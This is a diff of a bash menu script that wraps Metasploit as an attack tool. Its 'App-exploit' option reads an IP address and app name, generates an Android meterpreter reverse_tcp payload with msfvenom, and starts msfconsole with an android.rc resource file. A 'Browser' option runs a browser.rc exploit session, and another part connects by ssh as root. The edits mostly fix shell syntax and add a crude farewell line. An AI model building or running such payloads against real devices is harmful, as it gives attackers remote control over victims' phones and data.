@@ -27,34 +27,36 @@ if [[ "$f" == 'first' || "$f" == '1'  ]];
  echo "1.Browser "
  echo "2.App-exploit"
  read s
- if [[ "$s" == 'app' || "$s" == '2'  ]]
+ if [[ "$s" == 'app' || "$s" == '2'  ]];
  then
   echo "enter your ip address:"
   echo "need ip address? (local) (y/n) :"
   read i
-  fi
    if [[ "$i" == 'y' || "$i" == 'yes'  ]]; 
       then 
       sudo ifconfig
       echo "ip address: "
-   else 
+   fi
+    if [[ "$i" == 'n' || "$i" == 'no' ]];
+     then 
       echo "no need for them ip addresses "
       echo "ip address: "
-  fi
+   fi
   read ip
   echo $ip >>ipfile
   echo " app name:"
   read name
   echo "enter path :"
-#50 
+#50
+ 
     msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
     msfconsole -r android.rc
-
 fi
 fi
-if [[ "$s" == 'browser' || "$s" == '1' ]]; 
- then  
-msfconsole -r browser.rc
+fi
+if [[ "$s" == 'browser' || "$s" == '1' ]]
+ then
+ msfconsole -r browser.rc
 
 #60
 if [[ "$f" == 'second' || "$f" == '2' ]];
@@ -109,3 +111,5 @@ sleep 2
 ssh root@$ras
 
 fi
+echo bye bitcheass
+
